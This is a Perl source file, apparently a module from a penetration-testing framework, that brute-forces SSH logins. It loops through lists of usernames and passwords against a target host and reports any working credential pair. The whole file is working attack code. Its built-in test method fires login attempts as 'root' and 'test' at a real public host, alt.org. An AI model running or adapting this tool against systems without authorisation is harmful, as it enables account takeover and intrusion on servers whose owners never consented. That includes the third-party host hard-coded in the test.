# SSH Bruteforce
# --

use MooseX::Declare;
use core::task qw(execute);

# SSH bruteforce task
class SSH_Bruteforce extends Task {
    use Net::SSH2;

    # Process
    method _process(Str $target, Int $port, $users, $passw) {
        my ($cnt, $ssh2);

        $ssh2 = Net::SSH2->new();

        if ($ssh2->connect($target, $port)) {
            map {
                my $user = $_;

                map {
                    my $try = $_;

                    $ssh2->auth_password($user, $try);
                    my $ok = $ssh2->auth_ok();

                    if ($ok) {
                        $self->_write_result("pair $user:$try is good for $target");
                        return;
                    }

                    $cnt++;
                    sleep(1);
                } @$passw;
            } @$users;

            $self->_write_result("tried $cnt user:pass combinations on $target, none succeeded...");
        } else {
            $self->_write_result("Error: failed to connect to $target");
        }
    }

    # Main function
    method main($args) {
        my ($users, $passw);
        $users = $self->_get_arg($args, 0);
        $passw = $self->_get_arg($args, 1);

        $self->_process($self->target, $self->port || 22, $users, $passw);
    }

    # Test function
    method test {
        $self->_process("alt.org", 22, ["root", "test"], ["123", "qwerty"]);
    }
}

execute(SSH_Bruteforce->new());
